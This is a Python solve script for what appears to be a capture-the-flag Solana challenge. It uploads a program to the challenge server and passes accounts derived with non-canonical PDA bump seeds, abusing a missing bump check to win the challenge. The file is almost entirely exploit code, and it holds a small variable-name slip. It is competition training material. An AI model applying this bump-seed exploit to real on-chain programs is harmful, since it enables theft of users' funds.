from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58
from borsh_construct import CStruct, U8
import os
#os.system('cargo build-sbf')
#r = remote('127.0.0.1',1337)
r = remote("play.scriptsorcerers.xyz","10145")
solve = open('target/deploy/solve.so', 'rb').read()

r.recvuntil(b'program pubkey: ')
r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)
r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))
print("User:" + str(user))
r.recvuntil(b'noobmaster: ')
noobmaster = PublicKey(base58.b58decode(r.recvline().strip().decode()))
noobmaster_pda, noobmaster_bump = PublicKey.find_program_address([bytes(noobmaster),b'BIDDER'], program)
user_config_pda, user_config_bump = PublicKey.find_program_address([bytes(user),b'BIDDER'], program)
vault, vault_bump = PublicKey.find_program_address([b'VAULT'], program)
config, config_bump = PublicKey.find_program_address([b'INITIAL'], program)
winner, winner_bump = PublicKey.find_program_address([b'WINNER'], program)
PAYLOAD_SCHEMA = CStruct("config_bump" / U8, "vault_bump" / U8, "winner_bump" / U8, "winner_non_canonical" / U8)
print(config,config_bump)
def makeInputPayload(config_bump: int, vault_bump: int, winner_bump: int, winner_non_canonical_bump: int):
    return PAYLOAD_SCHEMA.build({"config_bump": config_bump, "vault_bump": vault_bump, "winner_bump": winner_bump,"winner_non_canonical":x_bump})

def findValidBump(seed: bytes, avoid_addr: PublicKey):
    for guess_bump in range(255, -1, -1):
        try:
            guess_addr = PublicKey.create_program_address(
                [seed, int(guess_bump).to_bytes(1, byteorder="little")],
                program,
            )
            if guess_addr != avoid_addr:
                break
        except:
            continue
    
    return guess_addr, guess_bump

config_addr, config_bump = findValidBump(b"INITIAL",config)
print(config_addr,config_bump)
vault_addr, vault_bump = findValidBump(b"VAULT",vault)
x_addr, x_bump = findValidBump(b"WINNER",winner)
input_payload = makeInputPayload(config_bump, vault_bump,winner_bump,x_bump)

r.sendline(b'9') # Number of accounts
# r.send(b'5') # Number of accounts
print(program)
r.sendline(b'x ' + str(program).encode())
r.sendline(b'ws ' + str(user).encode())
r.sendline(b'w ' + str(noobmaster_pda).encode())
r.sendline(b'w ' + str(user_config_pda).encode())
r.sendline(b'w ' + str(config_addr).encode())
r.sendline(b'w ' + str(vault_addr).encode())
r.sendline(b'w ' + str(winner).encode())
r.sendline(b'w ' + str(x_addr).encode())
r.sendline(b'x ' + str(ID).encode())
r.sendline(str(len(input_payload)).encode())
r.send(input_payload)
r.readuntil(b'1337 h4x0r: ')
print(r.readline().strip())
